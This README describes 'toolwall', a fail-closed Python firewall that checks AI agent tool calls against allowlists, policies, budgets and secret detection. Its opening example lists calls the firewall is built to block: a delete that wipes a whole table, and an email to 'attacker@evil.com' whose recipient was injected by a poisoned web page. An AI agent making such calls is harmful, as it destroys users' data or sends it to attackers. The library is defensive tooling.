# toolwall

[![PyPI version](https://img.shields.io/pypi/v/toolwall.svg)](https://pypi.org/project/toolwall/)
[![Python versions](https://img.shields.io/pypi/pyversions/toolwall.svg)](https://pypi.org/project/toolwall/)
[![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](https://github.com/Dev-Saif-Ops/toolwall/blob/main/toolwall/LICENSE)
[![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](https://github.com/Dev-Saif-Ops/toolwall)

**A fail-closed firewall for AI agent tool calls.**

Structured outputs already guarantee your agent's tool calls are *well-formed*.
Nothing guarantees they're *allowed*. `toolwall` is the checkpoint that sits between
the LLM's tool call and execution, and blocks the schema-valid-but-wrong ones.

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
db_query(limit=10_000_000)           # schema-valid. production melts.
```

Every one of these passes JSON schema validation. Nothing in the platform stack stops
them. `toolwall` does.

---

## Install

```bash
pip install toolwall
```

Zero required dependencies. Works with OpenAI, Anthropic, and Gemini native tool
calling (and plain dicts). Python 3.10+.

## Quickstart

```python
from toolwall import Gate, Meter, Policy, Shield, ToolSchema, in_range, not_empty

gate = Gate(default="deny", meter=Meter(), shield=Shield(mode="block"))

gate.register(
    "db_query", db_query,
    schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
    policy=Policy(constraints={"limit": in_range(1, 100)}),
)
gate.register(
    "delete_records", delete_records,
    schema=ToolSchema(required=["filter"], types={"filter": dict}),
    policy=Policy(constraints={"filter": not_empty}, require_approval=True),
)
gate.budget(max_calls=20)

result = gate.run(openai_response)   # any provider shape, or a plain dict
# result.verdict: ALLOW | BLOCK | NEEDS_APPROVAL. Only ALLOW executes.
```

## What it does

- **Fail-closed gate**: unknown tool, schema violation, policy violation, budget hit,
  or unparseable payload all block *before* the tool runs. Registration is the allowlist.
- **Policy engine**: value constraints (`in_range`, `one_of`, `matches`, `ends_with`…),
  cross-argument rules, human-approval flags, and budget caps (calls / per-tool / USD).
- **Shield**: detects secrets (AWS, OpenAI, GitHub, Stripe, Slack, JWT, PEM, and
  high-entropy strings) in tool arguments and blocks or redacts them. The audit log
  never contains the secret value.
- **Dry-run**: run your whole agent with `dry_run=True`: nothing executes, and
  `gate.report()` tells you what it *would* have done. `suggest_policies(gate)` drafts
  a starter policy from the calls it observed.
- **MCP guard**: `MCPGuard` puts the same gate in front of any MCP server.
- **Audit trail**: every verdict exported to JSON/CSV.

## Dry-run first

```python
from toolwall import Gate, Meter, suggest_policies

gate = Gate(default="deny", dry_run=True, meter=Meter())
# ... run your agent; ALLOW calls are simulated, never executed ...
print(gate.report())            # verdict counts, blocked reasons, secrets caught
print(suggest_policies(gate))   # a draft policy from observed calls, for you to review
```

## Guard an MCP server

```python
from toolwall import Gate, MCPGuard

guard = MCPGuard(gate, forward=call_downstream_mcp_server)
decision = guard.handle(tool_name, args)   # only ALLOW is forwarded
```

Install the transport extra with `pip install "toolwall[mcp]"`.

## Honest status

`toolwall` is alpha. The published failure suite blocks **24 of 24 attack cases across
9 classes with 0 false blocks** on clean traffic, at sub-millisecond overhead. Secret
detection is pattern + entropy based and is **never 100%**. Structureless passwords are
out of scope, and the suite report states exactly what is and is not proven. Every claim
about toolwall cites that report, nothing broader.

## Links

- **Source, full docs, and the failure suite:** https://github.com/Dev-Saif-Ops/toolwall
- **What happened to TOAP** (this project's predecessor, an honest postmortem):
  the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/toolwall/tree/toap-v0.1-archive) branch

## License

MIT © Mohammad Safwan Athar
